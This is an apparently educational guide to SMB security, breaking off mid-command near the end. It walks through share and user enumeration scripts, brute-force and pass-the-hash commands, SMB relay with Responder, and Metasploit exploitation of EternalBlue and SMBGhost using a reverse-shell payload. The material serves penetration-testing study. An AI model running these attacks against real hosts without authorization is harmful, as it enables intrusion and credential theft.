# Comprehensive Guide to SMB: Security, Enumeration, and Exploitation

## Introduction

Server Message Block (SMB) is a critical network file sharing protocol that has been a fundamental component of Windows networks since the early days of Microsoft networking. It allows applications and users to access files, printers, and other resources on remote servers. While essential for network functionality, SMB has also been a frequent target for attackers due to its widespread deployment and historical security vulnerabilities. This article provides a comprehensive overview of SMB from a security perspective, covering its basic functionality, enumeration techniques, authentication methods, common attack vectors, and security tools.

## Basic Information

### What is SMB?

Server Message Block (SMB) is a client-server communication protocol used for sharing access to files, printers, serial ports, and other resources on a network. It's primarily associated with Windows operating systems but is also implemented in Unix-like systems through Samba.

### Key Characteristics

- **Protocol Versions**:
  - **SMB 1.0**: Original version, deprecated and highly vulnerable
  - **SMB 2.0**: Introduced in Windows Vista, improved performance
  - **SMB 2.1**: Introduced in Windows 7, added client-side caching
  - **SMB 3.0**: Introduced in Windows 8, added encryption
  - **SMB 3.1.1**: Introduced in Windows 10, improved security

- **Port Usage**:
  - **TCP/445**: Direct SMB over TCP (modern implementations)
  - **TCP/139**: SMB over NetBIOS (legacy)

- **Core Functionality**:
  - File and printer sharing
  - Named pipes
  - Mailslots
  - Remote procedure calls (RPC)
  - Network browsing

- **Security Features**:
  - Authentication
  - Session security
  - Message signing
  - Encryption (in SMB 3.0+)

### Key Components

- **SMB Shares**: Network resources made available through SMB
- **NetBIOS**: Network Basic Input/Output System, used for name resolution
- **NTLM**: NT LAN Manager, authentication protocol
- **Kerberos**: Authentication protocol used in Windows domains
- **Named Pipes**: IPC mechanisms for process communication

## SMB Enumeration

Enumeration is the process of gathering information about SMB services, shares, and users on a target system. This information is valuable for identifying potential attack vectors.

### Network Discovery

#### Using Nmap

```bash
# Basic SMB scan
nmap -p 445 192.168.1.0/24

# Check for SMB on both ports
nmap -p 139,445 192.168.1.0/24

# Service detection
nmap -sV -p 139,445 192.168.1.10
```

#### Using Nbtscan

```bash
# Scan for NetBIOS names
nbtscan -r 192.168.1.0/24
```

### Service Enumeration

#### Using Nmap SMB Scripts

```bash
# Run all SMB scripts
nmap --script smb-* -p 139,445 192.168.1.10

# Enumerate shares
nmap --script smb-enum-shares -p 139,445 192.168.1.10

# Enumerate users
nmap --script smb-enum-users -p 139,445 192.168.1.10

# Check for SMB vulnerabilities
nmap --script smb-vuln* -p 139,445 192.168.1.10
```

#### Using Metasploit

```
# Launch Metasploit
msfconsole

# SMB version scanning
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.10
run

# SMB share enumeration
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.10
run
```

### SMB Version Detection

Detecting the SMB version helps identify potential vulnerabilities.

```python
import socket
import struct

def get_smb_version(host, port=445):
    # SMB Negotiate Protocol Request
    pkt = b'\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8'
    pkt += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff'
    pkt += b'\xff\xfe\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54'
    pkt += b'\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30'
    pkt += b'\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73'
    pkt += b'\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61'
    pkt += b'\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32'
    pkt += b'\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00'
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        s.send(pkt)
        resp = s.recv(1024)
        s.close()
        
        # Parse the response
        if resp[4] == 0xff and resp[5] == 0x53 and resp[6] == 0x4d and resp[7] == 0x42:
            # SMB1 response
            return "SMB1"
        elif resp[4] == 0xfe and resp[5] == 0x53 and resp[6] == 0x4d and resp[7] == 0x42:
            # SMB2 response
            dialect = struct.unpack('<H', resp[0x46:0x48])[0]
            if dialect == 0x0202:
                return "SMB2.02"
            elif dialect == 0x0210:
                return "SMB2.1"
            elif dialect == 0x0300:
                return "SMB3.0"
            elif dialect == 0x0302:
                return "SMB3.0.2"
            elif dialect == 0x0311:
                return "SMB3.1.1"
            else:
                return f"SMB2+ (Dialect: 0x{dialect:04x})"
        else:
            return "Unknown"
    except Exception as e:
        return f"Error: {str(e)}"

print(get_smb_version("192.168.1.10"))
```

### User Enumeration

#### Using Enum4linux

```bash
# Basic enumeration
enum4linux -a 192.168.1.10

# User enumeration
enum4linux -u administrator -p password -U 192.168.1.10
```

#### RID Cycling

RID (Relative Identifier) cycling is a technique used to enumerate user accounts by incrementally guessing RIDs.

```bash
# Using enum4linux
enum4linux -r 192.168.1.10

# Manual RID cycling using rpcclient
rpcclient -U "" -N 192.168.1.10
> enumdomusers
> queryuser 0x3e8
> queryuser 0x3e9
```

#### Python RID Cycling Implementation

```python
import subprocess
import re

def rid_cycle(target, start_rid=500, end_rid=1500):
    users = []
    
    for rid in range(start_rid, end_rid + 1):
        cmd = f"rpcclient -U \"\" -N {target} -c \"queryuser 0x{rid:x}\""
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode('utf-8')
            
            # If we get a valid response, extract the username
            if "User Name" in output:
                username_match = re.search(r"User Name\s+:\s+(.+?)\s", output)
                if username_match:
                    username = username_match.group(1)
                    users.append({"rid": rid, "username": username})
                    print(f"[+] Found user: {username} (RID: {rid})")
        except subprocess.CalledProcessError:
            pass
    
    return users

# Example usage
found_users = rid_cycle("192.168.1.10")
print(f"Found {len(found_users)} users")
```

### Share Enumeration

#### Using Smbclient

```bash
# List shares
smbclient -L //192.168.1.10 -U ""

# Connect to a share
smbclient //192.168.1.10/share_name -U ""
```

#### Using CrackMapExec

```bash
# Enumerate shares
crackmapexec smb 192.168.1.10 --shares

# Enumerate with credentials
crackmapexec smb 192.168.1.10 -u username -p password --shares
```

## Connecting to SMB Shares

### Anonymous Access

```bash
# Connect anonymously
smbclient //192.168.1.10/share_name -N

# Mount a share anonymously
sudo mount -t cifs //192.168.1.10/share_name /mnt/share -o guest
```

### Using Credentials

```bash
# Connect with credentials
smbclient //192.168.1.10/share_name -U domain/username%password

# Mount with credentials
sudo mount -t cifs //192.168.1.10/share_name /mnt/share -o username=user,password=pass
```

### Using Python

```python
from impacket import smbconnection

def connect_smb(target, username="", password="", domain=""):
    try:
        smb = smbconnection.SMBConnection(target, target)
        smb.login(username, password, domain)
        print(f"[+] Successfully authenticated to {target}")
        
        # List shares
        shares = smb.listShares()
        print("[+] Available shares:")
        for share in shares:
            print(f"  - {share['shi1_netname']}")
            
            # Try to list files in the share
            try:
                files = smb.listPath(share['shi1_netname'], "*")
                print(f"    Files: {len(files)} items found")
            except Exception as e:
                print(f"    Can't list files: {str(e)}")
        
        return smb
    except Exception as e:
        print(f"[-] Failed to connect: {str(e)}")
        return None

# Example usage
smb = connect_smb("192.168.1.10", "administrator", "password", "WORKGROUP")
```

## Attack Vectors

### Password Attacks

#### SMB Brute Force

```bash
# Using Hydra
hydra -l administrator -P /path/to/wordlist.txt smb://192.168.1.10

# Using Medusa
medusa -h 192.168.1.10 -u administrator -P /path/to/wordlist.txt -M smbnt
```

#### Using Metasploit

```
# Launch Metasploit
msfconsole

# SMB login bruteforce
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.10
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
set VERBOSE false
run
```

### Pass-the-Hash Attacks

Pass-the-Hash (PtH) attacks allow an attacker to authenticate using NTLM hashes without knowing the actual password.

```bash
# Using CrackMapExec
crackmapexec smb 192.168.1.10 -u administrator -H NTLM:HASH

# Using Impacket's psexec
psexec.py -hashes LMHASH:NTHASH administrator@192.168.1.10
```

### SMB Relay Attacks

SMB relay attacks involve intercepting SMB authentication attempts and relaying them to another host.

```bash
# Using Responder
sudo responder -I eth0 -wrfv

# Using ntlmrelayx
ntlmrelayx.py -t smb://192.168.1.10 -smb2support
```

### Exploiting Known Vulnerabilities

#### EternalBlue (MS17-010)

```bash
# Check for vulnerability
nmap --script smb-vuln-ms17-010 -p 445 192.168.1.10

# Using Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST your_ip
exploit
```

#### SMBGhost (CVE-2020-0796)

```bash
# Check for vulnerability
nmap --script smb-vuln-cve-2020-0796 -p 445 192.168.1.10

# Using Metasploit
use exploit/windows/smb/cve_2020_0796_smbghost
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST your_ip
exploit
```

## Tools and Frameworks

### Impacket

Impacket is a collection of Python classes for working with network protocols, including SMB.

```bash
# Install Impacket
pip install impacket

# Use Impacket's smbclient
python -m impacket.smbclient administrator:password@192.168.1.10

# Use Impacket's psexec
python -m impacket.psexec administrator:password@192.168.1.10
```

### CrackMapExec

CrackMapExec is a powerful post-exploitation tool designed to assess and exploit Windows networks.

```bash
# Install CrackMapExec
pip install crackmapexec

# Domain password spray
crackmapexec smb 192.168.1.0/24 -u administrator -p password

# Execute commands
crackmapexec smb 192.168.1.10 -u administrator -p password -x "whoami"
```

### Samba Suite

The Samba suite includes various tools for interacting with SMB/CIFS services.

```bash
# Install Samba tools
sudo apt-get install samba-common-bin

# Use nmblookup
nmblookup -A 192.168.1.10

# Use net
net view \\192.168.1.10
```

### Responder

Responder is a tool designed to poison LLMNR, NBT-NS, and MDNS responses.

```bash
# Install Responder
git clone https://github.com/lgandx/Responder
cd Responder

# Run Responder
sudo python3 Responder.py -I eth0 -wrfv
```

## Advanced Techniques

### Kerberos Authentication with SMB

```bash
# Get Kerberos ticket
kinit username@DOMAIN.COM

# Use SMB with Kerberos
smbclient //server.domain.com/share -